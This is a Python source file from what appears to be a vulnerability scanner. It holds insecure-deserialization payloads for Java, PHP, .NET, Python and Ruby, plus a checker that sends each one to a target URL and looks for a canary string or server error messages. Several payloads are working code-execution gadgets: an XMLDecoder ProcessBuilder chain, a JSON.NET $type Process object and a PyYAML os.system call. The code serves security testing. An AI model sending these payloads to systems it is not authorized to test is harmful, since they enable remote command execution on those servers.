"""
GrotAssault — Deserialization payloads.

Generates payloads targeting insecure deserialization in:
- Java (ObjectInputStream, XMLDecoder, SnakeYAML)
- PHP (unserialize)
- .NET (BinaryFormatter, JSON.NET)
- Python (pickle, yaml.load)
- Ruby (Marshal)
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from krumpa.core import Finding, Severity, Target

logger = logging.getLogger("krumpa.grotassault.deserialization")


@dataclass
class DeserPayload:
    """A deserialization attack payload."""
    name: str
    platform: str  # java, php, dotnet, python, ruby
    content_type: str
    payload: str
    description: str


# Payloads organized by platform
JAVA_PAYLOADS: List[DeserPayload] = [
    DeserPayload(
        name="java-ysoserial-urldns",
        platform="java",
        content_type="application/x-java-serialized-object",
        payload="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa",
        description="Java URLDNS gadget (triggers DNS lookup)",
    ),
    DeserPayload(
        name="java-xmldecoder",
        platform="java",
        content_type="application/xml",
        payload='<?xml version="1.0" encoding="UTF-8"?><java version="1.8.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></void></java>',
        description="Java XMLDecoder RCE",
    ),
]

PHP_PAYLOADS: List[DeserPayload] = [
    DeserPayload(
        name="php-object-injection",
        platform="php",
        content_type="application/x-www-form-urlencoded",
        payload='O:8:"stdClass":1:{s:4:"test";s:13:"DESER_CANARY";}',
        description="PHP object injection probe",
    ),
    DeserPayload(
        name="php-phar",
        platform="php",
        content_type="application/octet-stream",
        payload="phar://test.phar/test",
        description="PHP phar:// wrapper deserialization",
    ),
]

DOTNET_PAYLOADS: List[DeserPayload] = [
    DeserPayload(
        name="dotnet-viewstate",
        platform="dotnet",
        content_type="application/x-www-form-urlencoded",
        payload="__VIEWSTATE=/wEPDwUKLTEzNjQ2OTUzMw9kFgICAQ9kFgICBQ8PFgIeBFRleHQFDURFU0VSX0NBTkFSWWRkZA==",
        description=".NET ViewState injection probe",
    ),
    DeserPayload(
        name="dotnet-json-type",
        platform="dotnet",
        content_type="application/json",
        payload='{"$type":"System.Diagnostics.Process, System","StartInfo":{"FileName":"cmd","Arguments":"/c echo DESER_CANARY"}}',
        description=".NET JSON.NET TypeNameHandling exploit",
    ),
]

PYTHON_PAYLOADS: List[DeserPayload] = [
    DeserPayload(
        name="python-pickle-probe",
        platform="python",
        content_type="application/octet-stream",
        payload="gASVKAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwNJ0RFU0VSX0NBTkFSWSeklFKULg==",
        description="Python pickle probe (base64)",
    ),
    DeserPayload(
        name="python-yaml-load",
        platform="python",
        content_type="application/yaml",
        payload="!!python/object/apply:os.system ['echo DESER_CANARY']",
        description="Python yaml.load unsafe deserialization",
    ),
]

RUBY_PAYLOADS: List[DeserPayload] = [
    DeserPayload(
        name="ruby-marshal-probe",
        platform="ruby",
        content_type="application/octet-stream",
        payload='BAhvOhxBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgk6',
        description="Ruby Marshal.load probe",
    ),
]

ALL_DESER_PAYLOADS: List[DeserPayload] = (
    JAVA_PAYLOADS + PHP_PAYLOADS + DOTNET_PAYLOADS + PYTHON_PAYLOADS + RUBY_PAYLOADS
)


class DeserializationChecker:
    """Test for insecure deserialization vulnerabilities."""

    def __init__(self, http_client: Any = None) -> None:
        self._client = http_client
        self._owns_client = False

    async def check(
        self,
        target: Target,
        *,
        platforms: Optional[List[str]] = None,
    ) -> List[Finding]:
        """Test a target for deserialization vulnerabilities."""
        if not self._client:
            return []

        findings: List[Finding] = []
        payloads = ALL_DESER_PAYLOADS
        if platforms:
            payloads = [p for p in payloads if p.platform in platforms]

        for payload in payloads:
            try:
                resp = await self._client.request(
                    method=target.method or "POST",
                    url=target.url,
                    content=payload.payload.encode(),
                    headers={"Content-Type": payload.content_type},
                )

                if self._detect_success(resp, payload):
                    findings.append(Finding(
                        title=f"Insecure deserialization ({payload.platform}): {payload.name}",
                        description=(
                            f"Deserialization payload '{payload.name}' ({payload.platform}) "
                            f"appears to have been processed by {target.url}. "
                            f"{payload.description}"
                        ),
                        severity=Severity.CRITICAL,
                        target=target,
                        evidence=f"payload={payload.name}, platform={payload.platform}, status={resp.status_code}",
                        remediation=(
                            f"Never deserialize untrusted data. For {payload.platform}: "
                            f"use safe alternatives or strict type allowlists."
                        ),
                        cwe=502,
                        tags=["deserialization", payload.platform, "rce"],
                    ))
            except Exception as exc:
                logger.debug("Deser check error (%s): %s", payload.name, exc)

        return findings

    @staticmethod
    def _detect_success(resp: Any, payload: DeserPayload) -> bool:
        """Detect if deserialization payload was processed."""
        if resp.status_code >= 500:
            # Server error might indicate partial processing
            text = resp.text if hasattr(resp, 'text') else ""
            error_markers = [
                "ClassNotFoundException", "InvalidClassException",  # Java
                "unserialize()", "Unsupported operand",  # PHP
                "BinaryFormatter", "TypeNameHandling",  # .NET
                "pickle", "unpickle",  # Python
                "Marshal",  # Ruby
            ]
            return any(m in text for m in error_markers)

        if resp.status_code < 300:
            text = resp.text if hasattr(resp, 'text') else ""
            return "DESER_CANARY" in text

        return False
